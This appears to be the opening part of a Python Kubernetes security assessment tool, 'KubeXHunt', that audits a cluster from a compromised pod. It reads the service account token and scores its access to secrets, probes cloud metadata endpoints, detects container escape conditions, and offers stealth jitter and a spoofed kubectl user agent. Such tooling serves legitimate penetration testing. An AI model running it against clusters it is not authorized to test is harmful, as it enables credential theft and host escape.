#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║   KubeXHunt — Kubernetes Security Assessment Tool                           ║
║   Automated cluster security testing from a compromised pod                 ║
║                                                                              ║
║   Author  : Mayank Choubey                                                  ║
║   Version : 1.2.0                                                            ║
║   Usage   : python3 kubexhunt.py [--phase N] [--fast] [--stealth 0|1|2]    ║
║             [--output FILE] [--no-color] [--exploit MODULE]                 ║
║             [--no-mutate] [--diff PREV.json] [--proxy URL]                  ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os, sys, json, base64, socket, subprocess, threading, time, re, argparse, gzip
import urllib.request, urllib.error, urllib.parse, ssl, stat, shutil, tempfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from collections import defaultdict

# ══════════════════════════════════════════════════════════════════
# COLORS & UI
# ══════════════════════════════════════════════════════════════════
class C:
    RED     = "\033[91m"
    ORANGE  = "\033[38;5;208m"
    YELLOW  = "\033[93m"
    GREEN   = "\033[92m"
    BLUE    = "\033[94m"
    CYAN    = "\033[96m"
    MAGENTA = "\033[95m"
    WHITE   = "\033[97m"
    GRAY    = "\033[90m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RESET   = "\033[0m"
    BG_RED  = "\033[41m"

NO_COLOR = False

def c(color, text):
    if NO_COLOR: return str(text)
    return f"{color}{text}{C.RESET}"

def banner():
    print(c(C.RED, """
╔══════════════════════════════════════════════════════════════════════════════════╗
║                                                                                  ║"""))
    print(c(C.RED,"║") + c(C.BOLD+C.WHITE,"  ██╗  ██╗██╗   ██╗██████╗ ███████╗██╗  ██╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗  ") + c(C.RED,"║"))
    print(c(C.RED,"║") + c(C.WHITE,        "  ██║ ██╔╝██║   ██║██╔══██╗██╔════╝╚██╗██╔╝██║  ██║██║   ██║████╗  ██║╚══██╔══╝  ") + c(C.RED,"║"))
    print(c(C.RED,"║") + c(C.CYAN,         "  █████╔╝ ██║   ██║██████╔╝█████╗   ╚███╔╝ ███████║██║   ██║██╔██╗ ██║   ██║     ") + c(C.RED,"║"))
    print(c(C.RED,"║") + c(C.WHITE,        "  ██╔═██╗ ██║   ██║██╔══██╗██╔══╝   ██╔██╗ ██╔══██║██║   ██║██║╚██╗██║   ██║     ") + c(C.RED,"║"))
    print(c(C.RED,"║") + c(C.CYAN,         "  ██║  ██╗╚██████╔╝██████╔╝███████╗██╔╝ ██╗██║  ██║╚██████╔╝██║ ╚████║   ██║     ") + c(C.RED,"║"))
    print(c(C.RED,"║") + c(C.WHITE,        "  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝     ") + c(C.RED,"║"))
    print(c(C.RED, """║                                                                                  ║
║   Kubernetes Security Assessment Tool  v1.2.0                                    ║
║   Starting from a Compromised Pod → Full Cluster Audit + Attack Path Discovery   ║
║   Author: Mayank Choubey                                                         ║
╚══════════════════════════════════════════════════════════════════════════════════╝
"""))

def phase_header(num, name, desc):
    line = "─" * 68
    print(f"\n{c(C.CYAN, line)}")
    print(f"{c(C.BOLD+C.WHITE, f'  PHASE {num:>2}')} {c(C.CYAN, '│')} {c(C.BOLD+C.YELLOW, name)}")
    print(f"  {c(C.GRAY, desc)}")
    print(f"{c(C.CYAN, line)}")

def finding(sev_level, check, detail, remediation=None):
    icon_map  = {"CRITICAL":"🔴","HIGH":"🟠","MEDIUM":"🟡","LOW":"🔵","INFO":"ℹ️ ","PASS":"✅"}
    color_map = {"CRITICAL":C.RED,"HIGH":C.ORANGE,"MEDIUM":C.YELLOW,"LOW":C.BLUE,"INFO":C.CYAN,"PASS":C.GREEN}
    icon = icon_map.get(sev_level, "  ")
    col  = color_map.get(sev_level, C.WHITE)
    print(f"  {icon} {c(col, f'[{sev_level:8}]')} {c(C.BOLD, check)}")
    if detail:
        for line in str(detail).split('\n'):
            if line.strip():
                print(f"  {c(C.GRAY,'│')}          {c(C.DIM, line.strip()[:140])}")
    if remediation and sev_level not in ("PASS","INFO"):
        print(f"  {c(C.GRAY,'│')} {c(C.GREEN,'⚑ Fix:')} {c(C.DIM+C.GREEN, remediation[:140])}")
    FINDINGS.append({
        "severity": sev_level, "check": check,
        "detail": str(detail), "remediation": remediation or "",
        "phase": CURRENT_PHASE, "timestamp": datetime.now().isoformat()
    })

def info_line(msg):
    print(f"  {c(C.CYAN,'→')} {c(C.DIM, str(msg)[:160])}")

def section(title):
    print(f"\n  {c(C.BOLD+C.MAGENTA,'▸ '+title)}")

def jitter():
    """Apply timing jitter in stealth mode."""
    lvl = CTX.get("stealth", 0)
    if lvl >= 1:
        import random
        time.sleep(random.uniform(0.3, 2.0))
    if lvl >= 2:
        time.sleep(random.uniform(0.5, 1.5))

# ══════════════════════════════════════════════════════════════════
# GLOBALS
# ══════════════════════════════════════════════════════════════════
FINDINGS      = []
CURRENT_PHASE = "0"
CTX           = {}   # Shared context across all phases

# Attack path graph: list of dicts {from, to, via, severity}
ATTACK_GRAPH  = []
# Privilege scores for tokens
TOKEN_SCORES  = []

# CVE database
# Each entry has min_minor/max_minor for K8s minor version range comparison.
# "max_minor": None means all versions above min_minor are also affected (use "affected_all").
# "affected_all": True means every K8s version is affected (no fix released).
K8S_CVES = [
    {"id":"CVE-2018-1002105","desc":"API server privilege escalation via proxy",
     "affected":"< 1.10.11 | 1.11.x < 1.11.5 | 1.12.x < 1.12.3",
     "severity":"CRITICAL",
     # Fixed in 1.10.11, 1.11.5, 1.12.3 — all 1.13+ unaffected
     "fixed_minor": 13},
    {"id":"CVE-2019-11247",  "desc":"RBAC escalation via CRD subresources",
     "affected":"< 1.13.9 | 1.14.x < 1.14.5",
     "severity":"HIGH",
     "fixed_minor": 15},
    {"id":"CVE-2019-9512",   "desc":"HTTP/2 DoS (Ping Flood)",
     "affected":"< 1.14.0",
     "severity":"HIGH",
     "fixed_minor": 14},
    {"id":"CVE-2020-8554",   "desc":"Man-in-the-middle via ExternalIP service",
     "affected":"all versions (design issue, mitigation via admission)",
     "severity":"MEDIUM",
     "fixed_minor": None, "affected_all": True},
    {"id":"CVE-2021-25741",  "desc":"Symlink hostPath escape",
     "affected":"< 1.19.15 | 1.20.x < 1.20.11 | 1.21.x < 1.21.5",
     "severity":"HIGH",
     "fixed_minor": 22},
    {"id":"CVE-2022-3294",   "desc":"Node address bypass — API server SSRF",
     "affected":"< 1.25.4",
     "severity":"HIGH",
     "fixed_minor": 26},
    {"id":"CVE-2023-2727",   "desc":"SA token bypass via projected volumes",
     "affected":"< 1.24.14 | 1.25.x < 1.25.9",
     "severity":"HIGH",
     "fixed_minor": 26},
    {"id":"CVE-2023-2728",   "desc":"Bypassing mountable secrets policy",
     "affected":"< 1.24.14 | 1.25.x < 1.25.9",
     "severity":"HIGH",
     "fixed_minor": 26},
    {"id":"CVE-2024-21626",  "desc":"runc Leaky Vessels /proc/self/fd escape",
     "affected":"runc < 1.1.12 — containerd < 1.7.0 ships affected runc",
     "severity":"CRITICAL",
     "fixed_minor": None, "affected_all": False, "runc_check": True},
]

# Kernel CVE database with actual version ranges for comparison
# Format: affected_min=(major,minor,patch), affected_max=(major,minor,patch)
# None for affected_max means <= that version; check running > affected_max to clear.
KERNEL_CVES = [
    {"id":"CVE-2022-0847",   "desc":"DirtyPipe — arbitrary file overwrite",
     "severity":"CRITICAL",
     "affected":"5.8 – 5.16.11",
     "min":(5,8,0), "max":(5,16,11)},
    {"id":"CVE-2016-5195",   "desc":"DirtyCow — privilege escalation",
     "severity":"HIGH",
     "affected":"< 4.8.3",
     "min":(0,0,0), "max":(4,8,3)},
    {"id":"CVE-2021-3493",   "desc":"OverlayFS privilege escalation (Ubuntu)",
     "severity":"HIGH",
     "affected":"5.4 – 5.11 (Ubuntu kernels only)",
     "min":(5,4,0), "max":(5,11,999), "ubuntu_only": True},
    {"id":"CVE-2022-0185",   "desc":"Heap overflow via CAP_SYS_ADMIN",
     "severity":"CRITICAL",
     "affected":"< 5.16.2",
     "min":(0,0,0), "max":(5,16,2)},
    {"id":"CVE-2023-0386",   "desc":"OverlayFS privilege escalation",
     "severity":"HIGH",
     "affected":"< 6.2",
     "min":(0,0,0), "max":(6,2,0)},
]

def _parse_k8s_minor(git_ver):
    """Parse minor version integer from gitVersion like v1.35.2-eks-f69f56f."""
    try:
        # Strip leading v and split on dots/dashes
        clean = git_ver.lstrip("v").split("-")[0]
        parts = clean.split(".")
        return int(parts[1]) if len(parts) >= 2 else 0
    except:
        return 0

def _parse_kernel_ver(uname_r):
    """Parse (major, minor, patch) from kernel version string."""
    try:
        # e.g. 6.12.68-92.122.amzn2023.x86_64  or  5.15.0-91-generic
        clean = uname_r.split("-")[0]
        parts = clean.split(".")
        major = int(parts[0]) if len(parts) > 0 else 0
        minor = int(parts[1]) if len(parts) > 1 else 0
        patch = int(parts[2]) if len(parts) > 2 else 0
        return (major, minor, patch)
    except:
        return (0, 0, 0)

def _kernel_ver_in_range(running, kve_min, kve_max):
    """Return True if running kernel version is in [kve_min, kve_max] range."""
    return kve_min <= running <= kve_max

MITRE_MAP = {
    "CRITICAL": ["T1611 Escape to Host","T1552.007 Container API","T1610 Deploy Container"],
    "HIGH":     ["T1613 Container Discovery","T1078.004 Cloud Accounts"],
    "MEDIUM":   ["T1526 Cloud Service Discovery","T1538 Cloud Service Dashboard"],
}

CWE_MAP = {
    "secret":     "CWE-522 Insufficiently Protected Credentials",
    "escape":     "CWE-284 Improper Access Control",
    "rbac":       "CWE-269 Improper Privilege Management",
    "injection":  "CWE-94 Improper Control of Code Generation",
    "config":     "CWE-732 Incorrect Permission Assignment",
    "network":    "CWE-918 Server-Side Request Forgery",
}

# ══════════════════════════════════════════════════════════════════
# CORE HELPERS
# ══════════════════════════════════════════════════════════════════
def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    return ctx

def _get_ua():
    """Return kubectl-spoofed user agent in stealth mode."""
    if CTX.get("stealth", 0) >= 1:
        return "kubectl/v1.29.0 (linux/amd64) kubernetes/v1.29.0"
    return "KubeXHunt/1.2.0"

def k8s_api(path, method="GET", data=None, token=None, timeout=8):
    """Call Kubernetes API. Returns (status_code, dict_or_None)."""
    jitter()
    t   = token or CTX.get("token","")
    api = CTX.get("api","https://kubernetes.default")
    url = api + path
    headers = {
        "Authorization": f"Bearer {t}",
        "Content-Type":  "application/json",
        "Accept":        "application/json",
        "User-Agent":    _get_ua(),
    }
    proxy = CTX.get("proxy","")
    try:
        body = json.dumps(data).encode() if data else None
        if proxy:
            ph = urllib.parse.urlparse(proxy)
            opener = urllib.request.build_opener(
                urllib.request.ProxyHandler({ph.scheme: proxy}))
            urllib.request.install_opener(opener)
        req = urllib.request.Request(url, data=body, headers=headers, method=method)
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        try:    return e.code, json.loads(e.read())
        except: return e.code, None
    except Exception:
        return 0, None

def http_get(url, headers=None, timeout=5):
    """Simple HTTP GET. Returns (status, body_str)."""
    jitter()
    try:
        h = {"User-Agent": _get_ua()}
        if headers: h.update(headers)
        req = urllib.request.Request(url, headers=h)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception:
        return 0, ""

def http_get_noauth(path, timeout=5):
    """Call K8s API without auth token — for anonymous access test."""
    jitter()
    api = CTX.get("api","https://kubernetes.default")
    url = api + path
    try:
        req = urllib.request.Request(url, headers={"Accept":"application/json","User-Agent":_get_ua()})
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:    return e.code, json.loads(e.read())
        except: return e.code, None
    except Exception:
        return 0, None

def tcp_open(host, port, timeout=1.5):
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((host, int(port))); s.close(); return True
    except: return False

def dns_resolve(name):
    try:    return socket.gethostbyname(name)
    except: return None

def dns_srv(name):
    """Attempt SRV record lookup via socket."""
    try:
        results = socket.getaddrinfo(name, None, socket.AF_INET, socket.SOCK_STREAM)
        return [r[4][0] for r in results]
    except: return []

def run_cmd(cmd, timeout=10):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.returncode, r.stdout.strip(), r.stderr.strip()
    except subprocess.TimeoutExpired: return -1, "", "timeout"
    except Exception as e:           return -1, "", str(e)

def file_read(path, lines=None):
    try:
        with open(path) as f:
            if lines: return "".join([f.readline() for _ in range(lines)])
            return f.read()
    except: return None

def decode_b64(s):
    try:    return base64.b64decode(s).decode(errors="replace")
    except: return str(s)

def decode_jwt(token):
    try:
        parts = token.split(".")
        if len(parts) >= 2:
            padded = parts[1] + "=="
            return json.loads(base64.urlsafe_b64decode(padded))
    except: pass
    return {}

def truncate(s, n=120):
    s = str(s).replace("\n"," ")
    return s[:n]+"..." if len(s) > n else s

def add_attack_edge(frm, to, via, severity="HIGH"):
    ATTACK_GRAPH.append({"from": frm, "to": to, "via": via, "severity": severity})

# ══════════════════════════════════════════════════════════════════
# PRIVILEGE SCORING ENGINE
# ══════════════════════════════════════════════════════════════════
def score_token(token, label="current"):
    """Score a SA token 0-100 based on what it can do."""
    score = 0
    details = []
    checks = [
        ("/api/v1/secrets",                                   30, "list all secrets cluster-wide"),
        (f"/api/v1/namespaces/{CTX.get('namespace','default')}/secrets", 15, "list namespace secrets"),
        ("/api/v1/namespaces",                                10, "list namespaces"),
        ("/api/v1/pods",                                      10, "list pods cluster-wide"),
        ("/apis/apps/v1/deployments",                        10, "list deployments cluster-wide"),
        ("/apis/rbac.authorization.k8s.io/v1/clusterrolebindings", 15, "list clusterrolebindings"),
        ("/api/v1/namespaces/kube-system/secrets",           20, "list kube-system secrets"),
    ]
    for path, pts, desc in checks:
        code, _ = k8s_api(path, token=token, timeout=4)
        if code == 200:
            score += pts
            details.append(desc)
    TOKEN_SCORES.append({"label": label, "score": min(score, 100), "abilities": details})
    return score

def print_token_ranking():
    if not TOKEN_SCORES: return
    section("Token Privilege Ranking")
    sorted_tokens = sorted(TOKEN_SCORES, key=lambda x: x["score"], reverse=True)
    for t in sorted_tokens:
        bar = "█" * (t["score"] // 10) + "░" * (10 - t["score"] // 10)
        col = C.RED if t["score"] >= 70 else C.ORANGE if t["score"] >= 40 else C.GREEN
        score_str = f"[{t['score']:3}/100]"
        print(f"  {c(col, score_str)} {bar} {c(C.BOLD, t['label'])}")
        if t["abilities"]:
            print(f"           {c(C.DIM, ' | '.join(t['abilities'][:4]))}")
    if sorted_tokens:
        best = sorted_tokens[0]
        info_line(f"Best pivot token: {best['label']} (score {best['score']}/100)")

# ══════════════════════════════════════════════════════════════════
# ATTACK PATH ENGINE
# ══════════════════════════════════════════════════════════════════
def print_attack_paths():
    if not ATTACK_GRAPH: return
    print(f"\n{c(C.CYAN,'═'*68)}")
    print(c(C.BOLD+C.RED,"  ⚔  ATTACK PATH DISCOVERY"))
    print(f"{c(C.CYAN,'═'*68)}\n")

    # Group by severity
    critical_paths = [e for e in ATTACK_GRAPH if e["severity"] == "CRITICAL"]
    high_paths     = [e for e in ATTACK_GRAPH if e["severity"] == "HIGH"]

    # Build simple chains
    chains = []
    visited = set()
    for edge in ATTACK_GRAPH:
        if edge["from"] not in visited:
            chain = [edge]
            nxt = edge["to"]
            visited.add(edge["from"])
            for e2 in ATTACK_GRAPH:
                if e2["from"] == nxt and e2["from"] not in visited:
                    chain.append(e2)
                    visited.add(e2["from"])
                    nxt = e2["to"]
            chains.append(chain)

    for i, chain in enumerate(chains[:5], 1):
        top_sev = "CRITICAL" if any(e["severity"]=="CRITICAL" for e in chain) else "HIGH"
        col = C.RED if top_sev == "CRITICAL" else C.ORANGE
        print(f"  {c(col+C.BOLD, f'Attack Path #{i}')} {c(C.GRAY, f'({top_sev})')}")
        print(f"  {c(C.CYAN, chain[0]['from'])}")
        for edge in chain:
            print(f"  {c(C.GRAY,'   ↓')} {c(C.DIM, edge['via'])}")
            print(f"  {c(C.YELLOW, '   '+edge['to'])}")
        print()

# ══════════════════════════════════════════════════════════════════
# PHASE 0: SETUP & KUBECTL
# ══════════════════════════════════════════════════════════════════
def phase_setup():
    global CURRENT_PHASE
    CURRENT_PHASE = "0"
    phase_header("0","Setup & kubectl Installation",
                 "Detecting environment, installing kubectl, gathering credentials")

    section("kubectl Detection")
    rc, out, _ = run_cmd("kubectl version --client 2>/dev/null")
    if rc == 0 and out:
        info_line(f"kubectl present: {out.split(chr(10))[0]}")
        CTX["kubectl"] = True
    else:
        info_line("kubectl not found — searching for alternatives...")
        kubectl_found = False

        # Check common paths including host filesystem
        search_paths = [
            "/usr/local/bin/kubectl", "/usr/bin/kubectl", "/bin/kubectl",
            "/host/usr/local/bin/kubectl", "/host/usr/bin/kubectl",
            "/tmp/kubectl",
        ]
        for kpath in search_paths:
            if os.path.isfile(kpath) and os.access(kpath, os.X_OK):
                rc_k, out_k, _ = run_cmd(f"{kpath} version --client 2>/dev/null")
                if rc_k == 0:
                    # Symlink or copy to PATH
                    run_cmd(f"ln -sf {kpath} /usr/local/bin/kubectl 2>/dev/null || "
                            f"cp {kpath} /tmp/kubectl 2>/dev/null")
                    info_line(f"kubectl found at {kpath}")
                    CTX["kubectl"] = True
                    kubectl_found = True
                    finding("PASS","kubectl found on host filesystem",f"Path: {kpath}")
                    break

        if not kubectl_found:
            info_line("Attempting kubectl download...")
            _, arch, _ = run_cmd("uname -m")
            goarch = "arm64" if "aarch64" in arch or "arm64" in arch else "amd64"
            # Try to get latest stable version, fallback to known good version
            _, ver, _ = run_cmd(
                "curl -sL --max-time 5 https://dl.k8s.io/release/stable.txt 2>/dev/null || echo v1.29.0")
            version = ver.strip() or "v1.29.0"
            url = f"https://dl.k8s.io/release/{version}/bin/linux/{goarch}/kubectl"
            for cmd in [
                f"curl -sLf --max-time 15 -o /tmp/kubectl {url} 2>/dev/null || "
                f"wget -q --timeout=15 -O /tmp/kubectl {url} 2>/dev/null",
                "chmod +x /tmp/kubectl",
                "ln -sf /tmp/kubectl /usr/local/bin/kubectl 2>/dev/null",
            ]:
                run_cmd(cmd)
            rc2, out2, _ = run_cmd("/tmp/kubectl version --client 2>/dev/null")
            if rc2 == 0:
                CTX["kubectl"] = True
                kubectl_found = True
                finding("PASS","kubectl downloaded successfully",out2.split("\n")[0] if out2 else "")
            else:
                CTX["kubectl"] = False
                finding("INFO","kubectl not available — using Python urllib for all API calls",
                        "All K8s API checks will use direct HTTP — kubectl-specific checks skipped")

    section("Credential Gathering")
    token = file_read("/var/run/secrets/kubernetes.io/serviceaccount/token")
    if token:
        token = token.strip()
        CTX["token"] = token
        jwt  = decode_jwt(token)

        # Standard secret-based tokens
        ns   = jwt.get("kubernetes.io/serviceaccount/namespace","")
        sa   = jwt.get("kubernetes.io/serviceaccount/service-account.name","")

        # Projected volume / bound tokens use 'sub' field
        if not ns or not sa:
            sub = jwt.get("sub","")
            if sub.startswith("system:serviceaccount:"):
                parts = sub.split(":")
                if len(parts) == 4:
                    ns = parts[2]
                    sa = parts[3]

        # Fallback: read namespace file directly
        if not ns:
            ns = (file_read("/var/run/secrets/kubernetes.io/serviceaccount/namespace") or "").strip()

        exp  = jwt.get("exp", 0)
        aud  = jwt.get("aud", [])
        finding("INFO","SA token present",
                f"Namespace: {ns} | SA: {sa} | Expires: {datetime.fromtimestamp(exp) if exp else 'never'}\n"
                f"Audience: {aud}")
        CTX["namespace"] = ns
        CTX["sa_name"]   = sa
        # Token audience check
        if not aud or aud == [""] or (isinstance(aud, list) and len(aud) == 0):
            finding("HIGH","SA token has no audience claim — token replay risk",
                    "Token can potentially be replayed against OIDC or external services",
                    "Use bound service account tokens with specific audience")
        # Score current token
        score_token(token, f"{ns}/{sa}")
    else:
        finding("LOW","No SA token mounted","automountServiceAccountToken: false or no SA")
        CTX["token"] = ""
        CTX["namespace"] = os.environ.get("POD_NAMESPACE","default")

    ns_file = file_read("/var/run/secrets/kubernetes.io/serviceaccount/namespace")
    if ns_file and not CTX.get("namespace"):
        CTX["namespace"] = ns_file.strip()
    if not CTX.get("namespace"):
        CTX["namespace"] = "default"

    # CA cert
    ca = file_read("/var/run/secrets/kubernetes.io/serviceaccount/ca.crt")
    if ca:
        CTX["ca_cert"] = ca
        finding("INFO","CA cert mounted","/var/run/secrets/kubernetes.io/serviceaccount/ca.crt — usable for API MITM awareness")

    section("API Server")
    api_host = os.environ.get("KUBERNETES_SERVICE_HOST","kubernetes.default.svc")
    api_port = os.environ.get("KUBERNETES_SERVICE_PORT","443")
    CTX["api"] = f"https://{api_host}:{api_port}"
    info_line(f"API server: {CTX['api']}")

    code, resp = k8s_api(f"/api/v1/namespaces/{CTX['namespace']}")
    if code == 200:
        finding("PASS","Kubernetes API reachable", f"{CTX['api']}")
        CTX["api_ok"] = True
    elif code == 403:
        finding("INFO","API reachable — SA has limited RBAC access", f"HTTP {code}")
        CTX["api_ok"] = True
    elif code == 401:
        finding("INFO","API reachable — no SA token or token rejected (HTTP 401)",
                f"{CTX['api']}\nMost API-dependent checks will be skipped")
        CTX["api_ok"] = False
    else:
        finding("INFO",f"API unreachable (HTTP {code})", f"{CTX['api']}")
        CTX["api_ok"] = False

    section("kubectl In-Cluster Config")
    if CTX.get("kubectl") and CTX.get("token") and CTX.get("api"):
        # Check if kubectl already has a working kubeconfig
        rc_cfg, cfg_out, _ = run_cmd("kubectl config current-context 2>/dev/null", timeout=3)
        if rc_cfg != 0 or not cfg_out.strip():
            # Empty kubeconfig — auto-configure from mounted SA credentials
            api     = CTX["api"]
            token   = CTX["token"]
            ca_path = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
            sa_name = CTX.get("sa_name","sa")
            ns      = CTX.get("namespace","default")
            cmds = [
                f"kubectl config set-cluster in-cluster --server={api} --certificate-authority={ca_path} 2>/dev/null",
                f"kubectl config set-credentials {sa_name} --token={token} 2>/dev/null",
                f"kubectl config set-context default --cluster=in-cluster --user={sa_name} --namespace={ns} 2>/dev/null",
                "kubectl config use-context default 2>/dev/null",
            ]
            for cmd in cmds:
                run_cmd(cmd, timeout=5)
            # Verify it works now
            rc_v, out_v, _ = run_cmd(f"kubectl get pods -n {ns} --request-timeout=5s 2>/dev/null", timeout=8)
            if rc_v == 0 or "forbidden" in (out_v or "").lower() or "Error from server" in (out_v or ""):
                # Any server response (even 403) means kubectl is now talking to the cluster
                info_line("kubectl configured with in-cluster SA token")
            else:
                info_line("kubectl configured — limited by SA RBAC permissions")
        else:
            info_line(f"kubectl already has context: {cfg_out.strip()}")

    section("Cloud Provider Detection")
    cloud = _detect_cloud()
    CTX["cloud"] = cloud
    finding("INFO",f"Cloud provider: {cloud}","Provider-specific checks will activate in later phases")
    info_line(f"Namespace: {CTX['namespace']} | SA: {CTX.get('sa_name','unknown')} | Cloud: {cloud}")

def _detect_cloud():
    """Detect cloud provider with fallbacks for IMDSv2-only EKS clusters."""
    # Env var fingerprint first — fastest, no network needed
    aws_env_markers = [
        "AWS_DEFAULT_REGION","AWS_REGION","AWS_EXECUTION_ENV",
        "EKS_CLUSTER_NAME","AWS_ROLE_ARN","AWS_WEB_IDENTITY_TOKEN_FILE",
        "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI",
        "AWS_CONTAINER_CREDENTIALS_FULL_URI",
    ]
    if any(os.environ.get(k) for k in aws_env_markers):
        return "AWS"

    # IMDSv1 GET — 200 on IMDSv1-enabled, 401 on IMDSv2-only (both = AWS)
    code, _ = http_get("http://169.254.169.254/latest/meta-data/", timeout=3)
    if code in (200, 401):
        return "AWS"

    # IMDSv2 PUT token — succeeds even when GET is blocked
    try:
        req = urllib.request.Request(
            "http://169.254.169.254/latest/api/token", data=b"",
            headers={"X-aws-ec2-metadata-token-ttl-seconds":"21600","User-Agent":_get_ua()},
            method="PUT")
        with urllib.request.urlopen(req, timeout=3) as r:
            if r.status == 200:
                return "AWS"
    except: pass

    # Instance identity doc — any response from this AWS-specific path = AWS
    code2, _ = http_get(
        "http://169.254.169.254/latest/dynamic/instance-identity/document", timeout=3)
    if code2 in (200, 401, 403):
        return "AWS"

    # GKE metadata server
    code, _ = http_get("http://metadata.google.internal/",
                        headers={"Metadata-Flavor":"Google"}, timeout=3)
    if code in (200, 403):
        return "GKE"
    code, _ = http_get("http://metadata.google.internal/computeMetadata/v1/instance/",
                        headers={"Metadata-Flavor":"Google"}, timeout=3)
    if code in (200, 403):
        return "GKE"

    # Azure IMDS
    code, _ = http_get(
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        headers={"Metadata":"true"}, timeout=3)
    if code == 200:
        return "Azure"

    # OpenShift filesystem markers
    if (os.path.exists("/run/openshift-sdn") or
        os.path.exists("/etc/origin") or
        os.path.exists("/var/lib/origin")):
        return "OpenShift"

    # TCP reachability last resort — any response from 169.254.169.254 = likely AWS
    if tcp_open("169.254.169.254", 80, timeout=2):
        return "AWS"

    return "Unknown"

# ══════════════════════════════════════════════════════════════════
# PHASE 1: POD & CONTAINER RECON
# ══════════════════════════════════════════════════════════════════
def phase_pod_recon():
    global CURRENT_PHASE
    CURRENT_PHASE = "1"
    phase_header("1","Pod & Container Recon",
                 "Capabilities, seccomp, AppArmor, filesystem, hostPID/Net, runtime socket")

    section("Linux Capabilities")
    cap_data = file_read("/proc/self/status") or ""
    cap_eff  = ""
    for line in cap_data.split("\n"):
        if line.startswith("CapEff:"): cap_eff = line.split()[1]; break

    if cap_eff:
        cap_int  = int(cap_eff, 16)
        ALL_CAPS = 0x1FFFFFFFFF
        if cap_int == ALL_CAPS or cap_eff == "ffffffffffffffff":
            finding("CRITICAL","ALL Linux capabilities granted (privileged container)",
                    f"CapEff: {cap_eff} — equivalent to root on the node",
                    "Set privileged: false and capabilities.drop: [ALL]")
            add_attack_edge("Compromised Pod","Node Root","Privileged container → nsenter","CRITICAL")
        elif cap_int > 0x00000000a80425fb:
            finding("HIGH","Elevated capabilities detected",
                    f"CapEff: {cap_eff} — check for NET_RAW, SYS_ADMIN, SYS_PTRACE",
                    "Drop all caps; add back only required ones")
        else:
            finding("PASS","Capabilities within normal bounds",f"CapEff: {cap_eff}")

    section("Seccomp")
    seccomp = ""
    for line in cap_data.split("\n"):
        if line.startswith("Seccomp:"): seccomp = line.split()[1]; break
    if seccomp == "0":
        finding("HIGH","Seccomp disabled — all ~400 syscalls available","Seccomp: 0",
                "Set seccompProfile.type: RuntimeDefault")
    elif seccomp in ("1","2"):
        finding("PASS",f"Seccomp mode {seccomp} active","Syscall filtering active")

    section("AppArmor")
    aa = file_read("/proc/self/attr/current")
    if aa:
        aa = aa.strip().rstrip("\x00")
        if "unconfined" in aa:
            finding("MEDIUM","AppArmor unconfined",f"Profile: {aa}",
                    "Apply AppArmor RuntimeDefault or custom profile")
        else:
            finding("PASS",f"AppArmor profile: {aa}","AppArmor restricting syscalls")

    section("Filesystem")
    test_path = f"/ro-test-{int(time.time())}"
    try:
        with open(test_path,"w") as f: f.write("x")
        os.remove(test_path)
        finding("MEDIUM","Root filesystem is writable","",
                "Set readOnlyRootFilesystem: true")
    except (PermissionError, OSError):
        finding("PASS","Root filesystem is read-only","")

    # /proc/sys/kernel/core_pattern
    cp = file_read("/proc/sys/kernel/core_pattern")
    if cp and os.access("/proc/sys/kernel/core_pattern", os.W_OK):
        finding("CRITICAL","core_pattern is writable — privileged escape possible",
                f"Current: {cp.strip()}\nWrite pipe handler → code executes on host",
                "Remove SYS_ADMIN / privileged flag")
        add_attack_edge("Compromised Pod","Node Root","core_pattern write → host code exec","CRITICAL")
    else:
        finding("PASS","core_pattern not writable","")

    # /dev block devices
    dev_block = []
    if os.path.isdir("/dev"):
        for f in os.listdir("/dev"):
            full = f"/dev/{f}"
            try:
                if stat.S_ISBLK(os.stat(full).st_mode): dev_block.append(full)
            except: pass
    if dev_block:
        finding("HIGH","Block devices accessible in /dev",
                f"Devices: {', '.join(dev_block[:5])}\nRaw disk read → exfiltrate host data",
                "Remove hostPath /dev mount | Drop SYS_RAWIO")
    else:
        finding("PASS","No block devices in /dev","")

    section("hostPath Mounts")
    for mp in ["/host","/hostfs","/rootfs","/node","/mnt/host"]:
        if os.path.isdir(mp) and os.path.exists(f"{mp}/etc/shadow"):
            finding("CRITICAL",f"Host filesystem at {mp}",
                    "Read /etc/shadow, kubelet certs, SSH keys, pod tokens",
                    "Remove hostPath volumes")
            add_attack_edge("Compromised Pod","Node Root",f"chroot {mp} /bin/bash","CRITICAL")
            break
    else:
        finding("PASS","No host filesystem mount","")

    section("hostPID")
    pid1 = (file_read("/proc/1/comm") or "").strip()
    if pid1 in ("systemd","init","bash","sh"):
        finding("CRITICAL","hostPID: true — host PID namespace visible",
                f"PID 1: {pid1} (node init system)",
                "Remove hostPID: true")
        add_attack_edge("Compromised Pod","Host Processes","hostPID → /proc/<pid>/environ read","HIGH")
    else:
        finding("PASS","Isolated PID namespace",f"PID 1: {pid1}")

    section("hostNetwork")
    kubelet_10255 = tcp_open("127.0.0.1",10255,1.5)
    kubelet_10250 = tcp_open("127.0.0.1",10250,1.5)
    if kubelet_10255 or kubelet_10250:
        ports = []
        if kubelet_10255: ports.append("10255")
        if kubelet_10250: ports.append("10250")
        finding("CRITICAL","hostNetwork: true — kubelet reachable on localhost",
                f"Ports: {', '.join(ports)}",
                "Remove hostNetwork: true")
        add_attack_edge("Compromised Pod","Kubelet API","hostNetwork → localhost:10250","CRITICAL")
    else:
        finding("PASS","Kubelet not reachable on localhost","")

